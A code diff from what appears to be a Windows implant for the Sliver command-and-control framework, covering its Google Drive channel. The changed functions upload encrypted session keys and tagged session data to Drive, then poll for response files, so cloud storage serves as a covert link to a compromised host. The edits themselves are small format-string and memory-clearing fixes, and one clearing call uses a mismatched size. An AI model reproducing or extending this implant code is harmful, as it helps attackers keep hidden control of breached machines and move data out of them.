@@ -102,12 +102,12 @@ BOOL DriveUpload
 		NoHeapMemory = TRUE;
 		lpBody = VirtualAlloc(NULL, cbData + 0x400, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 		if (lpBody == NULL) {
-			LogError(L"VirtualAlloc failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
+			LogError(L"VirtualAlloc failed at %s. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
 			goto CLEANUP;
 		}
 	}
 
-	ZeroMemory(&SystemTime, sizeof(SYSTEMTIME));
+	SecureZeroMemory(&SystemTime, sizeof(SYSTEMTIME));
 	GetSystemTime(&SystemTime);
 	wsprintfA(szMetadata, "{\"mimeType\":\"application/octet-stream\",\"name\":\"%s\",\"parents\":[\"root\"]}", lpName);
 	lpUniqueBoundary = GenRandomStr(16);
@@ -128,7 +128,7 @@ BOOL DriveUpload
 
 	pResp = SendHttpRequest(&This->HttpConfig, pHttpClient, NULL, "POST", szContentType, lpBody, cbBody, TRUE, FALSE);
 	if (pResp->dwStatusCode != HTTP_STATUS_OK) {
-		LogError(L"dwStatusCode != HTTP_STATUS_OK at %lls\n", __FUNCTIONW__);
+		LogError(L"dwStatusCode != HTTP_STATUS_OK at %s\n", __FUNCTIONW__);
 		goto CLEANUP;
 	}
 
@@ -386,7 +386,7 @@ BOOL DriveSendRequest
 	CHAR szName[0x200];
 
 	SecureZeroMemory(szName, sizeof(szName));
-	sprintf(szName, "%s_%s_%lld.tex", pSliverClient->lpSendPrefix, pSliverClient->szSessionID, pSliverClient->uEncoderNonce);
+	wsprintfA(szName, "%s_%s_%lu.tex", pSliverClient->lpSendPrefix, pSliverClient->szSessionID, (DWORD)pSliverClient->uEncoderNonce);
 	return DriveUpload(&pSliverClient->DriveConfig, pData, cbData, szName);
 }
 
@@ -426,12 +426,12 @@ PSLIVER_DRIVE_CLIENT DriveSessionInit()
 
 	lpEncodedSessionKey = SliverBase64Encode(pEncryptedSessionInit, cbEncryptedSessionInit);
 	SecureZeroMemory(szName, sizeof(szName));
-	sprintf(szName, "%s.reg", pSliverClient->lpSendPrefix);
+	wsprintfA(szName, "%s.reg", pSliverClient->lpSendPrefix);
 	DriveUpload(&pSliverClient->DriveConfig, lpEncodedSessionKey, lstrlenA(lpEncodedSessionKey), szName);
 	Sleep(pSliverClient->dwPollInterval * 3);
 
 	SecureZeroMemory(szPattern, sizeof(lpRespFileId));
-	sprintf(szPattern, "%s_", pSliverClient->lpRecvPrefix);
+	wsprintfA(szPattern, "%s_", pSliverClient->lpRecvPrefix);
 	if (!GetFileId(&pSliverClient->DriveConfig, szPattern, &lpRespFileId)) {
 		goto CLEANUP;
 	}
